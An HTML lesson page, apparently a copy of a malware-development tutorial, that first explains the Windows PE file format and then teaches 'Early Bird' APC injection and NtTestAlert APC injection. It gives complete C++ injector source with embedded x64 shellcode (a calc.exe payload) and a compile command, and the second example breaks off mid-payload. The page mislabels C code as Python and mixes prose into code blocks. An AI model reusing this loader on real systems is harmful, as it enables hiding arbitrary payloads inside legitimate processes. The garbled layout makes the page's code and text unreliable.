@@ -1,0 +1,1551 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Windows shellcoding - part 3. PE file format</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #8</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">Windows shellcoding - part 3. PE file format</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This section can be read not only as a continuation of the previous ones, but also as a separate material. This one is overview of PE file format. PE file What is PE file format? It’s the native file format of Win32. Its specification is derived somewhat from the Unix Coff (common object file format). The meaning of “portable executable” is that the file format is universal across win32 platform: the PE loader of every win32 platform recognizes and uses this file format even when Windows is running on CPU platforms other than Intel. It doesn’t mean your PE executables would be able to port to other CPU platforms without change. Thus studying the PE file format gives you valuable insights into the structure of Windows. Basically PE file structure looks like this:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">91</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The PE File Format is essentially defined by the PE Header so you will want to read about that first, you don’t need to understand every single part of it but you should get an idea about it’s structure and be able to identify the parts that are most important. DOS header DOS header store the information needed to load the PE file. Therefore, this header is mandatory for loading a PE file. DOS header structure:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">typedef struct _IMAGE_DOS_HEADER {// DOS .EXE header
+WORD
+e_magic;
+// Magic number
+WORD
+e_cblp;
+// Bytes on last page of file
+WORD
+e_cp;
+// Pages in file
+WORD
+e_crlc;
+// Relocations
+WORD
+e_cparhdr;
+// Size of header in paragraphs
+WORD
+e_minalloc;
+// Minimum extra paragraphs needed
+WORD
+e_maxalloc;
+// Maximum extra paragraphs needed
+WORD
+e_ss;
+// Initial (relative) SS value
+WORD
+e_sp;
+// Initial SP value
+WORD
+e_csum;
+// Checksum
+WORD
+e_ip;
+// Initial IP value
+WORD
+e_cs;
+// Initial (relative) CS value
+WORD
+e_lfarlc;
+// File address of relocation table
+WORD
+e_ovno;
+// Overlay number
+WORD
+e_res[4];
+// Reserved words
+WORD
+e_oemid;
+// OEM identifier (for e_oeminfo)
+WORD
+e_oeminfo;
+// OEM information; e_oemid specific
+WORD
+e_res2[10];
+// Reserved words
+LONG
+e_lfanew;
+// File address of new exe header
+} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
+and it is 64 bytes in size. In this structure, the most important fields are e_magic and
+e_lfanew. The first two bytes of the header are the magic bytes which identify the file
+type, 4D 5A or “MZ” which are the initials of Mark Zbikowski who worked on DOS at
+Microsoft. These magic bytes define it as a PE file:
+
+e_lfanew - is at offset 0x3c of the DOS HEADER and contains the offset to the PE
+header:
+
+DOS stub
+After the first 64 bytes of the file, a dos stub starts. This area in memory is mostly filled
+with zeros:
+
+PE header
+This portion is small and simply contains a file signature which are the magic bytes
+PE\0\0 or 50 45 00 00:
+
+It’s structure:
+typedef struct _IMAGE_NT_HEADERS {
+DWORD Signature;
+IMAGE_FILE_HEADER FileHeader;
+IMAGE_OPTIONAL_HEADER32 OptionalHeader;
+} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s take a closer look at this structure. File Header (or COFF Header) - a set of fields describing the basic characteristics of the file:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">typedef struct _IMAGE_FILE_HEADER {
+WORD
+Machine;
+WORD
+NumberOfSections;
+DWORD
+TimeDateStamp;
+DWORD
+PointerToSymbolTable;
+DWORD
+NumberOfSymbols;
+WORD
+SizeOfOptionalHeader;
+WORD
+Characteristics;
+} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
+
+Optional Header - it’s optional in context of COFF object files but not PE files. It contains many important variables such as AddressOfEntryPoint, ImageBase, Section
+Alignment, SizeOfImage, SizeOfHeaders and the DataDirectory. This structure
+has 32-bit and 64-bit versions:
+typedef struct _IMAGE_OPTIONAL_HEADER {
+//
+// Standard fields.
+//
+WORD
+BYTE
+BYTE
+DWORD
+DWORD
+DWORD
+DWORD
+DWORD
+DWORD
+
+Magic;
+MajorLinkerVersion;
+MinorLinkerVersion;
+SizeOfCode;
+SizeOfInitializedData;
+SizeOfUninitializedData;
+AddressOfEntryPoint;
+BaseOfCode;
+BaseOfData;
+
+//
+// NT additional fields.
+//
+DWORD
+ImageBase;
+DWORD
+SectionAlignment;
+DWORD
+FileAlignment;
+WORD
+MajorOperatingSystemVersion;
+WORD
+MinorOperatingSystemVersion;
+WORD
+MajorImageVersion;
+WORD
+MinorImageVersion;
+WORD
+MajorSubsystemVersion;
+WORD
+MinorSubsystemVersion;
+DWORD
+Win32VersionValue;
+DWORD
+SizeOfImage;
+DWORD
+SizeOfHeaders;
+DWORD
+CheckSum;
+WORD
+Subsystem;
+WORD
+DllCharacteristics;
+DWORD
+SizeOfStackReserve;
+DWORD
+SizeOfStackCommit;
+DWORD
+SizeOfHeapReserve;
+DWORD
+SizeOfHeapCommit;
+DWORD
+LoaderFlags;
+DWORD
+NumberOfRvaAndSizes;
+IMAGE_DATA_DIRECTORY
+
+DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
+} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;
+
+Here I want to draw you attention to IMAGE_DATA_DIRECTORY:
+typedef struct _IMAGE_DATA_DIRECTORY {
+DWORD VirtualAddress;
+DWORD Size;
+} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
+it’s data directory. Simply it is an array (16 in size), each element of which contains a
+structure of 2 DWORD values.
+Currently, PE files can contain the following data directories:
+• Export Table
+• Import Table
+• Resource Table
+• Exception Table
+• Certificate Table
+• Base Relocation Table
+• Debug
+• Architecture
+• Global Ptr
+• TLS Table
+• Load Config Table
+• Bound Import
+• IAT (Import Address Table)
+• Delay Import Descriptor
+• CLR Runtime Header
+• Reserved, must be zero
+As I wrote earlier, I will consider in more detail only some of them.
+
+Section Table
+Contains an array of IMAGE_SECTION_HEADER structs which define the sections of the
+PE file such as the .text and .data sections. IMAGE_SECTION_HEADER structure is:
+typedef struct _IMAGE_SECTION_HEADER {
+BYTE
+Name[IMAGE_SIZEOF_SHORT_NAME];
+union {
+DWORD
+PhysicalAddress;
+DWORD
+VirtualSize;
+} Misc;
+DWORD
+VirtualAddress;
+DWORD
+SizeOfRawData;
+DWORD
+PointerToRawData;
+DWORD
+PointerToRelocations;
+DWORD
+PointerToLinenumbers;
+WORD
+NumberOfRelocations;
+WORD
+NumberOfLinenumbers;
+DWORD
+Characteristics;
+} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
+and consists of 0x28 bytes.
+Sections
+After the section table comes the actual sections:
+
+Applications do not directly access physical memory, they only access virtual memory.
+Sections are an area that is paged out into virtual memory and all work is done directly
+with this data. The address in virtual memory, without any offsets, is called the Virtual
+Address, or VA for short. In other words, the Virtual Addresses (VAs) are the memory
+addresses that are referenced by an application. Preferred download location for the
+application, set in the ImageBase field. It is like the point at which an application
+area begins in virtual memory. And the offsets RVA (Relative Virtual Address) are
+measured relative to this point. We can calculate RVA with the help of the following
+formula: RVA = VA - ImageBase. ImageBase is always known to us and having</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">received VA or RVA at our disposal, we can express one through the other. The size of each section is fixed in the section table, so the sections must be of a certain size, and for this they are supplemented with NULL bytes (00). An application in Windows NT typically has different predefined sections, such as .text, .bss, .rdata, .data, .rsrc. Depending on the application, some of these sections are used, but not all are used. .text In Windows, all code segments reside in a section called .text. .rdata The read-only data on the file system, such as strings and constants reside in a section called .rdata. .rsrc The .rsrc is a resource section, which contains resource information. In many cases it shows icons and images that are part of the file’s resources. It begins with a resource directory structure like most other sections, but this section’s data is further structured into a resource tree. IMAGE_RESOURCE_DIRECTORY, shown below, forms the root and nodes of the tree:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">typedef struct _IMAGE_RESOURCE_DIRECTORY {
+DWORD
+Characteristics;
+DWORD
+TimeDateStamp;
+WORD
+MajorVersion;
+WORD
+MinorVersion;
+WORD
+NumberOfNamedEntries;
+WORD
+NumberOfIdEntries;
+} IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;
+.edata The .edata section contains export data for an application or DLL. When</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">present, this section contains an export directory for getting to the export information. IMAGE_EXPORT_DIRECTORY structure is:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">typedef struct _IMAGE_EXPORT_DIRECTORY {
+ULONG
+Characteristics;
+ULONG
+TimeDateStamp;
+USHORT MajorVersion;
+USHORT MinorVersion;
+ULONG
+Name;
+ULONG
+Base;
+ULONG
+NumberOfFunctions;
+ULONG
+NumberOfNames;
+PULONG *AddressOfFunctions;
+PULONG *AddressOfNames;
+PUSHORT *AddressOfNameOrdinals;
+} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
+
+Exported symbols are generally found in DLLs, but DLLs can also import symbols. The
+main purpose of the export table is to associate the names and / or numbers of the
+exported functions with their RVA, that is, with the position in the process memory
+card.
+Import Address Table
+The Import Address Table is comprised of function pointers, and is used to get the
+addresses of functions when the DLLs are loaded. A compiled application was designed
+so that all API calls will not use direct hardcoded addresses but rather work through a
+function pointer.
+Conclusion
+The PE file format is more complex than I wrote in this post, for example, an interesting illustration about windows executable can be found on the Ange Albertini’s github
+project corkami:
+
+PE bear
+MSDN PE format
+corkami
+An In-Depth Look into the Win32 Portable Executable File Format
+An In-Depth Look into the Win32 Portable Executable File Format, Part 2
+MSDN IMAGE_NT_HEADERS
+MSDN IMAGE_FILE_HEADER
+MSDN IMAGE_OPTIONAL_HEADER
+MSDN IMAGE_DATA_DIRECTORY
+
+13. APC injection technique. Simple C++ malware.
+
+
+In the previous sections I wrote about classic code injection, and classic DLL injection.
+Today in this section I will discuss about a “Early Bird” APC injection technique. Today we’re going to look at QueueUserAPC which takes advantage of the asynchronous
+procedure call to queue a specific thread.
+Each thread has its own APC queue. An application queues an APC to a thread by
+calling the QueueUserAPC function. The calling thread specifies the address of an APC
+function in the call to QueueUserAPC. The queuing of an APC is a request for the thread
+to call the APC function.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">High level overview of this technique is: Firstly, our malicious program creates a new legitimate process (in our case notepad.exe):</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Whenever we see a call to CreateProcess, two important parameters we want to pay attention to are the first (executable to be invoked), and sixth (process creation flags). The creation flag is CREATE_SUSPENDED. Then, memory for payload is allocated in the newly created process’s memory space:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As I wrote earlier in previous posts, there is a very important difference between <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAlloc</code> and <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAllocEx</code>. The former will allocate memory in the calling process, the latter will allocate memory in a remote process. So if we see malware call <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAllocEx</code>, there more than likely will be some kind of cross process activity about to commence. APC routine pointing to the shellcode is declared. Then payload is written to the allocated memory:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">APC is queued to the main thread which is currently in suspended state:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Finally, thread is resumed and our payload is executed:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So, our full source code is (evil.cpp):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+// our payload calc.exe
+unsigned char my_payload[] = {
+0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
+0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
+0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
+0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
+0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
+0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
+0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
+0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
+0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
+0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
+0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
+0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
+0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
+0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
+0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
+0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
+0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
+0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
+0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
+0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
+0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
+0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0,
+0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
+0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
+0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
+0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
+0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
+};
+
+int main() {
+// Create a 64-bit process:
+STARTUPINFO si;
+PROCESS_INFORMATION pi;
+LPVOID my_payload_mem;
+SIZE_T my_payload_len = sizeof(my_payload);
+LPCWSTR cmd;
+HANDLE hProcess, hThread;
+NTSTATUS status;
+ZeroMemory(&amp;si, sizeof(si));
+ZeroMemory(&amp;pi, sizeof(pi));
+si.cb = sizeof(si);
+CreateProcessA(
+"C:\\Windows\\System32\\notepad.exe",
+NULL, NULL, NULL, false,
+CREATE_SUSPENDED, NULL, NULL, &amp;si, &amp;pi
+);
+WaitForSingleObject(pi.hProcess, 5000);
+hProcess = pi.hProcess;
+hThread = pi.hThread;
+// allocate a memory buffer for payload
+my_payload_mem = VirtualAllocEx(hProcess, NULL, my_payload_len,
+MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+// write payload to allocated buffer
+WriteProcessMemory(hProcess,
+my_payload_mem,
+my_payload,
+my_payload_len, NULL);
+// inject into the suspended thread.
+PTHREAD_START_ROUTINE apc_r = (PTHREAD_START_ROUTINE)my_payload_mem;
+QueueUserAPC((PAPCFUNC)apc_r, hThread, NULL);
+// resume to suspended thread
+ResumeThread(hThread);
+return 0;
+}
+As you can see for simplicity, we use 64-bit calc.exe as the payload. Without delving</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">into the generation of the payload, we will simply insert payload into our code:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">unsigned char my_payload[] = {
+0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
+0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
+0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
+0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
+0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
+0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
+0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
+0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
+0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
+0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
+0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
+0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
+0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
+0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
+0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
+0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
+0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
+0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
+0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
+0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
+0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
+0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0,
+0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
+0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
+0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
+0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
+0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
+};
+Let’s go to compile:</code></pre>
+            </div>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">x86_64-w64-mingw32-gcc evil.cpp -o evil.exe -s \</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">-ffunction-sections -fdata-sections -Wno-write-strings \ -fno-exceptions -fmerge-all-constants -static-libstdc++ \ -static-libgcc</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to launch a evil.exe on windows 7 x64:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">If we check the newly started notepad.exe in the Process Hacker, we can confirm that the main thread is indeed suspended:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, WaitForSingleObject function second parameter is 30000 for demonstration, in real-world scenario it’s not so big. Our evil.exe is also worked in windows 10 x64:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">APC MSDN <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">QueueUserAPC</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAllocEx</code> WaitForSingleObject</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">WriteProcessMemory</code> ResumeThread ZeroMemory Source code in Github In the future I will try to figure out more advanced code injection techniques. I hope this section spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">14. APC injection via NtTestAlert. Simple C++ malware.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In last section I wrote about “Early Bird” APC injection technique. In this section I will discuss about another APC injection technique. Its meaning is that we are using an undocumented function NtTestAlert. So let’s go to show how to execute shellcode within a local process by leveraging a Win32 API <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">QueueUserAPC</code> and an officially undocumented Native API NtTestAlert. NtTestAlert NtTestAlert is a system call that’s related to the alerts mechanism of Windows. This system call can cause execution of any pending APCs the thread has. Before a thread starts executing it’s Win32 start address it calls NtTestAlert to execute any pending APCs. example Let’s take a look at our C++ source code of our malware:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.cpp
+APC code injection via undocumented NtTestAlert
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2021/11/20/malware-injection-4.html
+*/
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+#pragma comment(lib, "ntdll")
+using myNtTestAlert = NTSTATUS(NTAPI*)();
+
+unsigned char my_payload[] = {
+0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
+0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
+0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
